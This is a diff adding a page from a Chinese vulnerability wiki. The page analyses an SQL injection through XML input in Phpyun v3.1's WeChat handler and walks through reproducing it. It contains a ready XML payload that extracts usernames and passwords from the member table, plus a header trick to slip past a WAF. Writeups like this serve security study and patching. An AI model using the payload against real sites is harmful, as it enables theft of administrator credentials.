@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/PhpYun/Phpyun%20v3.1%20xml%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Phpyun v3.1 xml 注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Phpyun v3.1 xml \u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Phpyun%20v4.2%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89%204.3%204.5%20%E7%B3%BB%E7%BB%9F%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Phpyun%20v4.2%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89%204.3%204.5%20%E7%B3%BB%E7%BB%9F%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Phpyun v4.2（部分） 4.3 4.5 系统重装漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../PhpBB/%EF%BC%88CVE-2019-13376%EF%BC%89PhpBB%E4%BB%8Esession%20id%E6%B3%84%E9%9C%B2%E5%88%B0CSRF%E5%88%B0XSS/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../PhpBB/%EF%BC%88CVE-2019-13376%EF%BC%89PhpBB%E4%BB%8Esession%20id%E6%B3%84%E9%9C%B2%E5%88%B0CSRF%E5%88%B0XSS/" class="btn btn-xs btn-link">
+        （CVE-2019-13376）PhpBB从session id泄露到CSRF到XSS
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="phpyun-v31-xml">Phpyun v3.1 xml 注入漏洞<a class="headerlink" href="#phpyun-v31-xml" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>函数过滤不严谨，用户POST过去的内容没有进行任何过滤，导致攻击者可以利用XML实体进行注入，从而获取数据库敏感信息</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>3.1 build14061</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>本次漏洞文件位于 <code>weixin/model/index.class.php</code> ，代码如下：</p>
+<p>private function responseMsg() { $postStr =
+$GLOBALS[\"HTTP_RAW_POST_DATA\"];</p>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="n">$postStr</span><span class="p">)){</span>
+
+<span class="w">             </span><span class="n">$postObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">simplexml_load_string</span><span class="p">(</span><span class="n">$postStr</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">SimpleXMLElement</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">LIBXML_NOCDATA</span><span class="p">);</span>
+<span class="w">              </span><span class="n">$fromUsername</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$postObj</span><span class="o">-&gt;</span><span class="n">FromUserName</span><span class="p">;</span>
+<span class="w">              </span><span class="n">$toUsername</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$postObj</span><span class="o">-&gt;</span><span class="n">ToUserName</span><span class="p">;</span>
+<span class="w">              </span><span class="n">$keyword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">trim</span><span class="p">(</span><span class="n">$postObj</span><span class="o">-&gt;</span><span class="n">Content</span><span class="p">);</span>
+<span class="w">              </span><span class="n">$time</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">time</span><span class="p">();</span>
+<span class="w">              </span><span class="n">$textTpl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&lt;xml&gt;</span>
+<span class="w">     </span><span class="o">&lt;!</span><span class="p">[</span><span class="n">CDATA</span><span class="p">[</span><span class="nf">%s</span><span class="p">]]</span><span class="o">&gt;</span>
+<span class="w">     </span><span class="o">&lt;!</span><span class="p">[</span><span class="n">CDATA</span><span class="p">[</span><span class="nf">%s</span><span class="p">]]</span><span class="o">&gt;</span>
+<span class="w">     </span><span class="nf">%s</span>
+<span class="w">     </span><span class="o">&lt;!</span><span class="p">[</span><span class="n">CDATA</span><span class="p">[</span><span class="nf">%s</span><span class="p">]]</span><span class="o">&gt;</span>
+<span class="w">     </span><span class="o">&lt;!</span><span class="p">[</span><span class="n">CDATA</span><span class="p">[</span><span class="nf">%s</span><span class="p">]]</span><span class="o">&gt;</span>
+<span class="w">     </span><span class="mi">0</span>
+<span class="w">     </span><span class="o">&lt;/</span><span class="n">xml</span><span class="o">&gt;</span><span class="s">&quot;;</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="w"> </span><span class="n">$keyword</span><span class="w"> </span><span class="p">))</span>
+<span class="w">              </span><span class="p">{</span>
+<span class="w">              </span><span class="n">$msgType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;text&quot;</span><span class="p">;</span>
+<span class="w">               </span><span class="n">$contentStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Welcome to wechat world!&quot;</span><span class="p">;</span>
+<span class="w">               </span><span class="n">$resultStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sprintf</span><span class="p">(</span><span class="n">$textTpl</span><span class="p">,</span><span class="w"> </span><span class="n">$fromUsername</span><span class="p">,</span><span class="w"> </span><span class="n">$toUsername</span><span class="p">,</span><span class="w"> </span><span class="n">$time</span><span class="p">,</span><span class="w"> </span><span class="n">$msgType</span><span class="p">,</span><span class="w"> </span><span class="n">$contentStr</span><span class="p">);</span>
+<span class="w">               </span><span class="n">echo</span><span class="w"> </span><span class="n">$resultStr</span><span class="p">;</span>
+<span class="w">              </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+<span class="w">               </span><span class="n">echo</span><span class="w"> </span><span class="s">&quot;Input something...&quot;</span><span class="p">;</span>
+<span class="w">              </span><span class="p">}</span>
+
+<span class="w">      </span><span class="p">}</span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">       </span><span class="n">echo</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span>
+<span class="w">       </span><span class="n">exit</span><span class="p">;</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+</code></pre></div>
+
+<p>这里将$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"]，通过
+simplexml_load_string解析后的内容，将其直接带入了$textTpl。</p>
+<p>然而$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"]
+，直接获取了POST过来的XML内容，没有经过任何处理，并在最后将其输出。
+if($MsgType==\'event\') { $MsgEvent = $postObj-&gt;Event; if
+($MsgEvent==\'subscribe\') { $centerStr =
+\"\&lt;![CDATA[欢迎您关注\".iconv(\'gbk\',\'utf-8\',$this-&gt;config[\'sy_webname\']).\"！/n
+1：您可以直接回复关键字如【销售】、【南京 销售】、【南京 销售
+XX公司】查找您想要的职位/n绑定您的账户体验更多精彩功能/n感谢您的关注！]]&gt;\";
+$this-&gt;MsgType = \'text\';</p>
+<div class="codehilite"><pre><span></span><code><span class="w">  </span><span class="p">}</span><span class="n">elseif</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">MsgEvent</span><span class="o">==</span><span class="s">&#39;CLICK&#39;</span><span class="p">)</span>
+<span class="w">  </span><span class="p">{</span>
+<span class="w">   </span><span class="err">$</span><span class="n">EventKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">postObj</span><span class="o">-&gt;</span><span class="n">EventKey</span><span class="p">;</span>
+<span class="w">   </span><span class="nf">if</span><span class="p">(</span><span class="err">$</span><span class="n">EventKey</span><span class="o">==</span><span class="s">&#39;我的帐号&#39;</span><span class="p">){</span>
+<span class="w">    </span><span class="err">$</span><span class="n">centerStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">bindUser</span><span class="p">(</span><span class="err">$</span><span class="n">fromUsername</span><span class="p">);</span>
+
+<span class="w">   </span><span class="p">}</span><span class="n">elseif</span><span class="p">(</span><span class="err">$</span><span class="n">EventKey</span><span class="o">==</span><span class="s">&#39;我的消息&#39;</span><span class="p">)</span>
+<span class="w">   </span><span class="p">{</span>
+<span class="w">    </span><span class="err">$</span><span class="n">centerStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">myMsg</span><span class="p">(</span><span class="err">$</span><span class="n">fromUsername</span><span class="p">);</span>
+<span class="w">   </span><span class="p">}</span><span class="n">elseif</span><span class="p">(</span><span class="err">$</span><span class="n">EventKey</span><span class="o">==</span><span class="s">&#39;面试邀请&#39;</span><span class="p">)</span>
+<span class="w">   </span><span class="p">{</span>
+<span class="w">    </span><span class="err">$</span><span class="n">centerStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">Audition</span><span class="p">(</span><span class="err">$</span><span class="n">fromUsername</span><span class="p">);</span>
+
+<span class="w">   </span><span class="p">}</span><span class="n">elseif</span><span class="p">(</span><span class="err">$</span><span class="n">EventKey</span><span class="o">==</span><span class="s">&#39;简历查看&#39;</span><span class="p">)</span>
+<span class="w">   </span><span class="p">{</span>
+
+<span class="w">    </span><span class="err">$</span><span class="n">centerStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">lookResume</span><span class="p">(</span><span class="err">$</span><span class="n">fromUsername</span><span class="p">);</span>
+
+<span class="w">   </span><span class="p">}</span><span class="n">elseif</span><span class="p">(</span><span class="err">$</span><span class="n">EventKey</span><span class="o">==</span><span class="s">&#39;刷新简历&#39;</span><span class="p">)</span>
+<span class="w">   </span><span class="p">{</span>
+
+<span class="w">    </span><span class="err">$</span><span class="n">centerStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">refResume</span><span class="p">(</span><span class="err">$</span><span class="n">fromUsername</span><span class="p">);</span>
+</code></pre></div>
+
+<p>从上述代码可以看出来，当满足那上面的条件后都会进入不同的相应的函数，但是都会进入一个名为<code>isBind</code>函数。</p>
+<p>接下来追踪isBind函数：</p>
+<p>private function isBind($wxid=\'\') {</p>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="p">(</span><span class="n">$wxid</span><span class="p">)</span>
+<span class="err">{</span>
+<span class="w"> </span><span class="n">$User</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">obj</span><span class="o">-&gt;</span><span class="n">DB_select_once</span><span class="p">(</span><span class="s2">&quot;member&quot;</span><span class="p">,</span><span class="s2">&quot;`wxid`=&#39;&quot;</span><span class="p">.</span><span class="n">$wxid</span><span class="p">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">,</span><span class="s2">&quot;`uid`,`username`&quot;</span><span class="p">);</span>
+<span class="err">}</span>
+<span class="k">if</span><span class="p">(</span><span class="n">$User</span><span class="err">[</span><span class="s1">&#39;uid&#39;</span><span class="err">]</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span>
+<span class="err">{</span>
+<span class="w"> </span><span class="n">$User</span><span class="err">[</span><span class="s1">&#39;bindtype&#39;</span><span class="err">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="p">;</span>
+<span class="w"> </span><span class="n">$User</span><span class="err">[</span><span class="s1">&#39;cenetrTpl&#39;</span><span class="err">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;![CDATA[您的&quot;</span><span class="p">.</span><span class="n">iconv</span><span class="p">(</span><span class="s1">&#39;gbk&#39;</span><span class="p">,</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">config</span><span class="err">[</span><span class="s1">&#39;sy_webname&#39;</span><span class="err">]</span><span class="p">).</span><span class="s2">&quot;帐号：&quot;</span><span class="p">.</span><span class="n">$User</span><span class="err">[</span><span class="s1">&#39;username&#39;</span><span class="err">]</span><span class="p">.</span><span class="s2">&quot;已成功绑定！ /n/n/n 您也可以config[&#39;sy_weburl&#39;].&quot;</span><span class="o">/</span><span class="n">wap</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="nv">?</span><span class="n">m</span><span class="o">=</span><span class="n">login</span><span class="o">&amp;</span><span class="n">wxid</span><span class="o">=</span><span class="s2">&quot;.$wxid.&quot;</span><span class="o">/</span><span class="s2">&quot;&gt;点击这里进行解绑或绑定其他帐号]]&gt;&quot;</span><span class="p">;</span>
+
+<span class="err">}</span><span class="k">else</span><span class="err">{</span>
+
+<span class="w"> </span><span class="n">$Token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">getToken</span><span class="p">();</span>
+<span class="w"> </span><span class="n">$Url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;https://api.weixin.qq.com/cgi-bin/user/info?access_token=&#39;</span><span class="p">.</span><span class="n">$Token</span><span class="p">.</span><span class="s1">&#39;&amp;openid=&#39;</span><span class="p">.</span><span class="n">$wxid</span><span class="p">.</span><span class="s1">&#39;&amp;lang=zh_CN&#39;</span><span class="p">;</span>
+<span class="w"> </span><span class="n">$CurlReturn</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">CurlPost</span><span class="p">(</span><span class="n">$Url</span><span class="p">);</span>
+<span class="w"> </span><span class="n">$UserInfo</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="n">json_decode</span><span class="p">(</span><span class="n">$CurlReturn</span><span class="p">);</span>
+
+<span class="w"> </span><span class="n">$wxid</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="n">$wxid</span><span class="p">;</span>
+<span class="w"> </span><span class="n">$wxname</span><span class="w">      </span><span class="o">=</span><span class="w"> </span><span class="n">$UserInfo</span><span class="o">-&gt;</span><span class="n">nickname</span><span class="p">;</span>
+<span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">config</span><span class="err">[</span><span class="s1">&#39;token_time&#39;</span><span class="err">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">time</span><span class="p">();</span>
+
+<span class="w"> </span><span class="n">$User</span><span class="err">[</span><span class="s1">&#39;cenetrTpl&#39;</span><span class="err">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&lt;![CDATA[您还没有绑定帐号，config[&#39;</span><span class="n">sy_weburl</span><span class="s1">&#39;].&#39;</span><span class="o">/</span><span class="n">wap</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="nv">?</span><span class="n">m</span><span class="o">=</span><span class="n">login</span><span class="o">&amp;</span><span class="n">wxid</span><span class="o">=</span><span class="s1">&#39;.$wxid.&#39;</span><span class="s2">&quot;&gt;点击这里进行绑定!]]&gt;&#39;;</span>
+<span class="s2">}</span>
+
+<span class="s2">return $User;</span>
+
+<span class="s2">}</span>
+</code></pre></div>
+
+<p>可以看到，从始至终wxid变量始终没有经过任何过滤，在第一行的<code>$wxid</code>就是我们传进来的FromUserName的值，可以直接进入SQL语句，进行任意注入。</p>
+<p>因此我们可以针对其构造Payload，内容如下：</p>
+<p>一般来说，我们只需要将Payload以POST形式的数据发出去，就可以成功的获取数据库敏感信息，但是服务器如果有WAF，提交的恶意数据必然会被拦截，因此，我们需要修改HTTP头，伪装成XML就可以不受到WAF的拦截：</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">Content</span><span class="o">-</span><span class="k">type</span><span class="p">:</span><span class="nx">text</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">charset</span><span class="p">=</span><span class="nx">utf</span><span class="o">-</span><span class="mi">8</span>
+</code></pre></div>
+
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>我们首先打开目标站点，点击网页左侧注册按钮，首先注册一个账号：</p>
+<p><img alt="" src="../resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.gif" /></p>
+<p>这个时候已经是登录状态，我们按<code>F9</code> 调出 <code>Hack Bar</code>
+的界面，点击<code>Enable Post data</code> ，将Payload写入输入框，如下图所示：</p>
+<p><img alt="" src="../resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
+<h4 id="payload">payload文件:<a class="headerlink" href="#payload" title="Permanent link">&para;</a></h4>
+<h5 id="payload_1">注:payload文件内容需手动输入相应位置<a class="headerlink" href="#payload_1" title="Permanent link">&para;</a></h5>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xml&gt;</span>
+<span class="w">    </span>1111
+<span class="w">    </span>1111&#39;<span class="w"> </span>and<span class="w"> </span>1=2<span class="w"> </span>union<span class="w"> </span>select<span class="w"> </span>1,(select<span class="w"> </span>concat(username,password)<span class="w"> </span>from<span class="w"> </span>phpyun_member<span class="w"> </span>limit<span class="w"> </span>0,1)#
+<span class="w">    </span>1402550611
+<span class="w">    </span>event
+<span class="w">    </span>CLICK
+<span class="w">    </span>我的账号
+<span class="w">    </span>0
+<span class="w">  </span><span class="nt">&lt;/xml&gt;</span>
+</code></pre></div>
+
+<p>接下来还需要修改HTTP头，伪装成XML，点击浏览器上方工具栏，打开<code>Tamper Data</code>
+，点击启动。</p>
+<p><img alt="" src="../resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId30.gif" /></p>
+<p>现在前提工作已经做好，接下来重新访问网站，Tamper Data
+就会抓取到数据包，再对数据包进行更改，操作如图：</p>
+<p><img alt="" src="../resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId31.gif" /></p>
+<p>然后点击确定就可以将构造好的数据包发出去：</p>
+<p><img alt="" src="../resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId32.gif" /></p>
+<p>成功获取管理员账号密码。</p>
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://blog.csdn.net/whatiwhere/article/details/84862236">https://blog.csdn.net/whatiwhere/article/details/84862236</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Phpyun%20v4.2%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89%204.3%204.5%20%E7%B3%BB%E7%BB%9F%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Phpyun%20v4.2%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89%204.3%204.5%20%E7%B3%BB%E7%BB%9F%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Phpyun v4.2（部分） 4.3 4.5 系统重装漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../PhpBB/%EF%BC%88CVE-2019-13376%EF%BC%89PhpBB%E4%BB%8Esession%20id%E6%B3%84%E9%9C%B2%E5%88%B0CSRF%E5%88%B0XSS/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../PhpBB/%EF%BC%88CVE-2019-13376%EF%BC%89PhpBB%E4%BB%8Esession%20id%E6%B3%84%E9%9C%B2%E5%88%B0CSRF%E5%88%B0XSS/" class="btn btn-xs btn-link">
+        （CVE-2019-13376）PhpBB从session id泄露到CSRF到XSS
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
